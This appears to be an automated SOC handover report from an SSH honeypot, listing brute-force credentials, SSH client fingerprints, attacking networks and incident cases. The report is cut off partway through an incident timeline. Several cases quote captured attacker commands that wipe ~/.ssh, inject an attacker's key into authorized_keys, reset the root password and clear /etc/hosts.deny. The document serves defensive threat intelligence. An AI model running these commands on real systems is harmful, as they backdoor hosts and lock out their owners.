# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-12 |
| **Generated At** | 2026-06-12T21:51:19Z |
| **Shift Time** | 21:51 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **474** |
| Confirmed Threats | **402** |
| False Positives Filtered | **72** (15.2%) |
| Unique Attacker IPs | **54** |
| Countries of Origin | **15** |
| High Severity Cases | **129** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **345** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **352** |
| Unique Credential Pairs | **220** |
| Unique Usernames | **134** |
| Unique Passwords | **184** |
| Successful Auth Pairs | **84** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 130 |
| `345gs5662d34` | 60 |
| `ubuntu` | 7 |
| `admin` | 7 |
| `dev` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 60 |
| `345gs5662d34` | 60 |
| `123456` | 29 |
| `123` | 4 |
| `1234` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 60 |
| `345gs5662d34` | `345gs5662d34` | 60 |
| `dev` | `qwerty12345` | 2 |
| `rodrigo` | `rodrigo123` | 2 |
| `root` | `Cn123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `!QAZ2wsx#EDC4rfv` | `43.143.107.19` | 2026-06-12T18:22:38 |
| `root` | `admin` | `185.220.101.102` | 2026-06-12T18:24:10 |
| `root` | `Gg112233` | `120.48.130.213` | 2026-06-12T18:25:11 |
| `root` | `3245gs5662d34` | `120.48.130.213` | 2026-06-12T18:25:25 |
| `root` | `hello` | `117.33.242.180` | 2026-06-12T18:25:48 |
| `root` | `1q2w3e4r?` | `103.186.31.66` | 2026-06-12T18:26:11 |
| `root` | `3245gs5662d34` | `103.186.31.66` | 2026-06-12T18:26:13 |
| `root` | `Cn123456` | `114.219.157.97` | 2026-06-12T18:41:07 |
| `root` | `Dd123123` | `114.219.157.97` | 2026-06-12T18:46:04 |
| `root` | `QAZ123wsx456` | `103.74.5.44` | 2026-06-12T18:46:23 |
| `root` | `3245gs5662d34` | `103.74.5.44` | 2026-06-12T18:46:30 |
| `root` | `jenkins` | `114.219.157.97` | 2026-06-12T18:46:57 |
| `root` | `2020.` | `209.99.190.200` | 2026-06-12T18:49:55 |
| `root` | `3245gs5662d34` | `209.99.190.200` | 2026-06-12T18:49:58 |
| `root` | `1qazXSW@` | `196.196.253.20` | 2026-06-12T18:50:02 |
| `root` | `3245gs5662d34` | `196.196.253.20` | 2026-06-12T18:50:07 |
| `root` | `1qaz2wsx123` | `209.99.190.200` | 2026-06-12T18:55:21 |
| `root` | `jenkins` | `103.74.5.44` | 2026-06-12T18:55:57 |
| `root` | `shine` | `196.196.253.20` | 2026-06-12T18:56:03 |
| `root` | `1qazzaq1` | `42.180.132.32` | 2026-06-12T18:56:59 |
| `root` | `iddqd` | `209.99.190.200` | 2026-06-12T18:57:03 |
| `root` | `oliver` | `196.196.253.20` | 2026-06-12T18:58:13 |
| `root` | `1qaz2wsx3EDC` | `196.196.253.20` | 2026-06-12T19:00:20 |
| `root` | `m123456789` | `114.219.157.97` | 2026-06-12T19:00:35 |
| `root` | `Alibaba123` | `103.74.5.44` | 2026-06-12T19:00:44 |
| `root` | `Zaq12wsx!` | `196.196.253.20` | 2026-06-12T19:02:34 |
| `root` | `Qaz12345678!` | `196.196.253.20` | 2026-06-12T19:06:51 |
| `root` | `585858` | `103.60.242.169` | 2026-06-12T19:07:10 |
| `root` | `3245gs5662d34` | `103.60.242.169` | 2026-06-12T19:07:13 |
| `root` | `Lol12345` | `103.74.5.44` | 2026-06-12T19:07:49 |
| `root` | `Manager1` | `196.196.253.20` | 2026-06-12T19:08:56 |
| `root` | `Welcome@2026` | `103.74.5.44` | 2026-06-12T19:10:09 |
| `root` | `Asd123$` | `209.99.190.200` | 2026-06-12T19:11:09 |
| `root` | `vps@2024` | `103.60.242.169` | 2026-06-12T19:11:30 |
| `root` | `Aa1234567890@` | `103.74.5.44` | 2026-06-12T19:12:35 |
| `root` | `1234@qwer` | `209.99.190.200` | 2026-06-12T19:12:54 |
| `root` | `Asdfghjkl;'` | `103.60.242.169` | 2026-06-12T19:15:33 |
| `root` | `135792468` | `196.196.253.20` | 2026-06-12T19:17:21 |
| `root` | `123321...` | `196.196.253.20` | 2026-06-12T19:19:30 |
| `root` | `Dd123123` | `103.74.5.44` | 2026-06-12T19:19:31 |
| `root` | `m123456789` | `103.74.5.44` | 2026-06-12T19:21:48 |
| `root` | `ABCabc123!@#` | `196.196.253.20` | 2026-06-12T19:23:59 |
| `root` | `qwe123qwe` | `103.60.242.169` | 2026-06-12T19:25:52 |
| `root` | `Cn123456` | `103.74.5.44` | 2026-06-12T19:26:35 |
| `root` | `ready2go` | `103.60.242.169` | 2026-06-12T19:27:51 |
| `root` | `Hl123456` | `103.74.5.44` | 2026-06-12T19:28:55 |
| `root` | `zxcvbnm@123` | `103.60.242.169` | 2026-06-12T19:29:55 |
| `root` | `Cb123456@` | `103.60.242.169` | 2026-06-12T19:32:00 |
| `root` | `Ww112233` | `103.74.5.44` | 2026-06-12T19:33:42 |
| `root` | `karkulka` | `209.99.190.200` | 2026-06-12T19:34:09 |
| `root` | `Admin1234@` | `102.220.87.78` | 2026-06-12T19:34:43 |
| `root` | `3245gs5662d34` | `102.220.87.78` | 2026-06-12T19:34:49 |
| `root` | `#1` | `43.163.107.154` | 2026-06-12T19:35:58 |
| `root` | `3245gs5662d34` | `43.163.107.154` | 2026-06-12T19:36:00 |
| `root` | `1qaz2wsx!QAZ` | `196.196.253.20` | 2026-06-12T19:36:36 |
| `root` | `Bi123456` | `196.196.253.20` | 2026-06-12T19:38:50 |
| `root` | `Ds123456` | `152.32.182.41` | 2026-06-12T19:40:51 |
| `root` | `3245gs5662d34` | `152.32.182.41` | 2026-06-12T19:40:57 |
| `root` | `abc123456.` | `103.60.242.169` | 2026-06-12T19:42:16 |
| `root` | `Comtom@2024` | `103.74.5.44` | 2026-06-12T19:50:24 |
| `root` | `p@ssw0Rd` | `115.191.34.255` | 2026-06-12T20:46:04 |
| `root` | `max` | `14.248.83.33` | 2026-06-12T20:53:53 |
| `root` | `3245gs5662d34` | `14.248.83.33` | 2026-06-12T20:53:57 |
| `root` | `babu` | `42.51.40.180` | 2026-06-12T20:55:28 |
| `root` | `3245gs5662d34` | `42.51.40.180` | 2026-06-12T20:55:32 |
| `root` | `Test@123456` | `14.248.83.33` | 2026-06-12T20:58:38 |
| `root` | `qwerasdf` | `103.100.84.116` | 2026-06-12T20:59:15 |
| `root` | `3245gs5662d34` | `103.100.84.116` | 2026-06-12T20:59:20 |
| `root` | `kate` | `14.248.83.33` | 2026-06-12T21:00:57 |
| `root` | `Zr123456@` | `14.248.83.33` | 2026-06-12T21:05:29 |
| `root` | `test2026!` | `14.248.83.33` | 2026-06-12T21:07:47 |
| `root` | `babu` | `14.248.83.33` | 2026-06-12T21:10:07 |
| `root` | `Mw123456789` | `14.248.83.33` | 2026-06-12T21:17:09 |
| `root` | `qwerasdf` | `14.248.83.33` | 2026-06-12T21:23:59 |
| `root` | `batman` | `14.248.83.33` | 2026-06-12T21:26:18 |
| `root` | `Cl123456@` | `222.253.40.231` | 2026-06-12T21:29:04 |
| `root` | `3245gs5662d34` | `222.253.40.231` | 2026-06-12T21:29:08 |
| `root` | `zzidc2024` | `182.253.79.195` | 2026-06-12T21:29:29 |
| `root` | `3245gs5662d34` | `182.253.79.195` | 2026-06-12T21:29:34 |
| `root` | `yh@123456` | `14.248.83.33` | 2026-06-12T21:33:15 |
| `root` | `5tgbnhy67ujm` | `14.248.83.33` | 2026-06-12T21:44:42 |
| `root` | `hola` | `104.244.74.84` | 2026-06-12T21:47:32 |
| `root` | `3245gs5662d34` | `104.244.74.84` | 2026-06-12T21:47:38 |
| `root` | `Admin!23` | `14.248.83.33` | 2026-06-12T21:49:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **474** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 402 |
| OpenSSH | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 354 | 24 |
| `03a80b21afa8...` | Modern SSH client | 19 | 5 |
| `acaa53e0a7d7...` | Mirai/variant | 3 | 3 |
| `1cc79c7da9b5...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 354 | 24 | Mirai/variant |
| `95420f9d932d...` | libssh | 29 | 5 | — |
| `03a80b21afa8...` | libssh | 19 | 5 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 3 | 3 | Mirai/variant |
| `1cc79c7da9b5...` | OpenSSH | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 8 | 5 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 60 | 15 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:xNZNab6oETNm"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `114.219.157.97`, `115.191.34.255`, `43.143.107.19`, `117.33.242.180`, `42.180.132.32`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `196.196.253.20`, `103.186.31.66`, `42.51.40.180`, `209.99.190.200`, `222.253.40.231`, `182.253.79.195`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **54** |
| Unique ASNs | **41** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS45899` | VNPT Corp | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (129)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a881811587ee

| Field | Detail |
|---|---|
| **Source IP** | `43.143.107[.]19` |
| **First Seen** | 2026-06-12 18:22 |
| **Last Seen** | 2026-06-12 18:23 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xNZNab6oETNm"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:22:37` | `cowrie.session.connect` |
| `2026-06-12 18:22:37` | `cowrie.client.version` |
| `2026-06-12 18:22:37` | `cowrie.client.kex` |
| `2026-06-12 18:22:38` | `cowrie.login.success` |
| `2026-06-12 18:22:38` | `cowrie.session.params` |
| `2026-06-12 18:22:38` | `cowrie.command.input` |
| `2026-06-12 18:22:38` | `cowrie.command.failed` |
| `2026-06-12 18:22:38` | `cowrie.log.closed` |
| `2026-06-12 18:22:38` | `cowrie.session.params` |
| `2026-06-12 18:22:38` | `cowrie.command.input` |
| `2026-06-12 18:22:38` | `cowrie.session.file_download` |
| `2026-06-12 18:22:38` | `cowrie.log.closed` |
| `2026-06-12 18:22:55` | `cowrie.session.params` |
| `2026-06-12 18:22:55` | `cowrie.command.input` |
| `2026-06-12 18:22:55` | `cowrie.log.closed` |
| `2026-06-12 18:22:55` | `cowrie.session.params` |
| `2026-06-12 18:22:55` | `cowrie.command.input` |
| `2026-06-12 18:22:55` | `cowrie.log.closed` |
| `2026-06-12 18:22:56` | `cowrie.session.params` |
| `2026-06-12 18:22:56` | `cowrie.command.input` |
| `2026-06-12 18:22:56` | `cowrie.session.file_download` |
| `2026-06-12 18:22:56` | `cowrie.log.closed` |
| `2026-06-12 18:22:56` | `cowrie.session.params` |
| `2026-06-12 18:22:56` | `cowrie.command.input` |
| `2026-06-12 18:22:56` | `cowrie.log.closed` |
| `2026-06-12 18:22:56` | `cowrie.session.params` |
| `2026-06-12 18:22:56` | `cowrie.command.input` |
| `2026-06-12 18:22:57` | `cowrie.log.closed` |
| `2026-06-12 18:22:57` | `cowrie.session.params` |
| `2026-06-12 18:22:57` | `cowrie.command.input` |
| `2026-06-12 18:22:57` | `cowrie.command.input` |
| `2026-06-12 18:22:57` | `cowrie.log.closed` |
| `2026-06-12 18:22:57` | `cowrie.session.params` |
| `2026-06-12 18:22:57` | `cowrie.command.input` |
| `2026-06-12 18:22:58` | `cowrie.log.closed` |
| `2026-06-12 18:22:58` | `cowrie.session.params` |
| `2026-06-12 18:22:58` | `cowrie.command.input` |
| `2026-06-12 18:22:58` | `cowrie.log.closed` |
| `2026-06-12 18:22:58` | `cowrie.session.params` |
| `2026-06-12 18:22:58` | `cowrie.command.input` |
| `2026-06-12 18:22:59` | `cowrie.log.closed` |
| `2026-06-12 18:22:59` | `cowrie.session.params` |
| `2026-06-12 18:22:59` | `cowrie.command.input` |
| `2026-06-12 18:22:59` | `cowrie.log.closed` |
| `2026-06-12 18:22:59` | `cowrie.session.params` |
| `2026-06-12 18:22:59` | `cowrie.command.input` |
| `2026-06-12 18:23:00` | `cowrie.log.closed` |
| `2026-06-12 18:23:00` | `cowrie.session.params` |
| `2026-06-12 18:23:00` | `cowrie.command.input` |
| `2026-06-12 18:23:00` | `cowrie.log.closed` |
| `2026-06-12 18:23:00` | `cowrie.session.params` |
| `2026-06-12 18:23:00` | `cowrie.command.input` |
| `2026-06-12 18:23:00` | `cowrie.log.closed` |
| `2026-06-12 18:23:01` | `cowrie.session.params` |
| `2026-06-12 18:23:01` | `cowrie.command.input` |
| `2026-06-12 18:23:01` | `cowrie.log.closed` |
| `2026-06-12 18:23:01` | `cowrie.session.params` |
| `2026-06-12 18:23:01` | `cowrie.command.input` |
| `2026-06-12 18:23:01` | `cowrie.log.closed` |
| `2026-06-12 18:23:02` | `cowrie.session.params` |
| `2026-06-12 18:23:02` | `cowrie.command.input` |
| `2026-06-12 18:23:02` | `cowrie.log.closed` |
| `2026-06-12 18:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.143.107[.]19` to AbuseIPDB if not already reported
- [ ] Block `43.143.107[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99ea485d0eb

| Field | Detail |
|---|---|
| **Source IP** | `185.220.101[.]102` |
| **First Seen** | 2026-06-12 18:24 |
| **Last Seen** | 2026-06-12 18:24 |
| **Session Duration** | 20s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:24:08` | `cowrie.session.connect` |
| `2026-06-12 18:24:08` | `cowrie.client.version` |
| `2026-06-12 18:24:08` | `cowrie.client.kex` |
| `2026-06-12 18:24:09` | `cowrie.client.fingerprint` |
| `2026-06-12 18:24:09` | `cowrie.login.failed` |
| `2026-06-12 18:24:10` | `cowrie.login.success` |
| `2026-06-12 18:24:28` | `cowrie.direct-tcpip.request` |
| `2026-06-12 18:24:28` | `cowrie.direct-tcpip.ja4` |
| `2026-06-12 18:24:28` | `cowrie.direct-tcpip.data` |
| `2026-06-12 18:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.220.101[.]102` to AbuseIPDB if not already reported
- [ ] Block `185.220.101[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49f541a9f33c

| Field | Detail |
|---|---|
| **Source IP** | `120.48.130[.]213` |
| **First Seen** | 2026-06-12 18:25 |
| **Last Seen** | 2026-06-12 18:25 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:25:09` | `cowrie.session.connect` |
| `2026-06-12 18:25:09` | `cowrie.client.version` |
| `2026-06-12 18:25:11` | `cowrie.client.kex` |
| `2026-06-12 18:25:11` | `cowrie.login.success` |
| `2026-06-12 18:25:14` | `cowrie.session.params` |
| `2026-06-12 18:25:14` | `cowrie.command.input` |
| `2026-06-12 18:25:14` | `cowrie.command.failed` |
| `2026-06-12 18:25:15` | `cowrie.log.closed` |
| `2026-06-12 18:25:15` | `cowrie.session.params` |
| `2026-06-12 18:25:15` | `cowrie.command.input` |
| `2026-06-12 18:25:16` | `cowrie.session.file_download` |
| `2026-06-12 18:25:16` | `cowrie.log.closed` |
| `2026-06-12 18:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.130[.]213` to AbuseIPDB if not already reported
- [ ] Block `120.48.130[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c23e5eb5b0

| Field | Detail |
|---|---|
| **Source IP** | `120.48.130[.]213` |
| **First Seen** | 2026-06-12 18:25 |
| **Last Seen** | 2026-06-12 18:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:25:24` | `cowrie.session.connect` |
| `2026-06-12 18:25:24` | `cowrie.client.version` |
| `2026-06-12 18:25:25` | `cowrie.client.kex` |
| `2026-06-12 18:25:25` | `cowrie.login.success` |
| `2026-06-12 18:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.130[.]213` to AbuseIPDB if not already reported
- [ ] Block `120.48.130[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d98ee94ffd61

| Field | Detail |
|---|---|
| **Source IP** | `117.33.242[.]180` |
| **First Seen** | 2026-06-12 18:25 |
| **Last Seen** | 2026-06-12 18:26 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:NIOKC4rjinp0"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:25:47` | `cowrie.session.connect` |
| `2026-06-12 18:25:47` | `cowrie.client.version` |
| `2026-06-12 18:25:47` | `cowrie.client.kex` |
| `2026-06-12 18:25:48` | `cowrie.login.success` |
| `2026-06-12 18:25:48` | `cowrie.session.params` |
| `2026-06-12 18:25:48` | `cowrie.command.input` |
| `2026-06-12 18:25:48` | `cowrie.command.failed` |
| `2026-06-12 18:25:48` | `cowrie.log.closed` |
| `2026-06-12 18:25:48` | `cowrie.session.params` |
| `2026-06-12 18:25:48` | `cowrie.command.input` |
| `2026-06-12 18:25:49` | `cowrie.session.file_download` |
| `2026-06-12 18:25:49` | `cowrie.log.closed` |
| `2026-06-12 18:26:17` | `cowrie.session.params` |
| `2026-06-12 18:26:17` | `cowrie.command.input` |
| `2026-06-12 18:26:17` | `cowrie.log.closed` |
| `2026-06-12 18:26:17` | `cowrie.session.params` |
| `2026-06-12 18:26:17` | `cowrie.command.input` |
| `2026-06-12 18:26:18` | `cowrie.log.closed` |
| `2026-06-12 18:26:18` | `cowrie.session.params` |
| `2026-06-12 18:26:18` | `cowrie.command.input` |
| `2026-06-12 18:26:18` | `cowrie.session.file_download` |
| `2026-06-12 18:26:18` | `cowrie.log.closed` |
| `2026-06-12 18:26:18` | `cowrie.session.params` |
| `2026-06-12 18:26:18` | `cowrie.command.input` |
| `2026-06-12 18:26:19` | `cowrie.log.closed` |
| `2026-06-12 18:26:19` | `cowrie.session.params` |
| `2026-06-12 18:26:19` | `cowrie.command.input` |
| `2026-06-12 18:26:19` | `cowrie.log.closed` |
| `2026-06-12 18:26:19` | `cowrie.session.params` |
| `2026-06-12 18:26:19` | `cowrie.command.input` |
| `2026-06-12 18:26:19` | `cowrie.command.input` |
| `2026-06-12 18:26:20` | `cowrie.log.closed` |
| `2026-06-12 18:26:20` | `cowrie.session.params` |
| `2026-06-12 18:26:20` | `cowrie.command.input` |
| `2026-06-12 18:26:20` | `cowrie.log.closed` |
| `2026-06-12 18:26:20` | `cowrie.session.params` |
| `2026-06-12 18:26:20` | `cowrie.command.input` |
| `2026-06-12 18:26:20` | `cowrie.log.closed` |
| `2026-06-12 18:26:21` | `cowrie.session.params` |
| `2026-06-12 18:26:21` | `cowrie.command.input` |
| `2026-06-12 18:26:21` | `cowrie.log.closed` |
| `2026-06-12 18:26:21` | `cowrie.session.params` |
| `2026-06-12 18:26:21` | `cowrie.command.input` |
| `2026-06-12 18:26:21` | `cowrie.log.closed` |
| `2026-06-12 18:26:22` | `cowrie.session.params` |
| `2026-06-12 18:26:22` | `cowrie.command.input` |
| `2026-06-12 18:26:22` | `cowrie.log.closed` |
| `2026-06-12 18:26:22` | `cowrie.session.params` |
| `2026-06-12 18:26:22` | `cowrie.command.input` |
| `2026-06-12 18:26:22` | `cowrie.log.closed` |
| `2026-06-12 18:26:23` | `cowrie.session.params` |
| `2026-06-12 18:26:23` | `cowrie.command.input` |
| `2026-06-12 18:26:23` | `cowrie.log.closed` |
| `2026-06-12 18:26:23` | `cowrie.session.params` |
| `2026-06-12 18:26:23` | `cowrie.command.input` |
| `2026-06-12 18:26:23` | `cowrie.log.closed` |
| `2026-06-12 18:26:24` | `cowrie.session.params` |
| `2026-06-12 18:26:24` | `cowrie.command.input` |
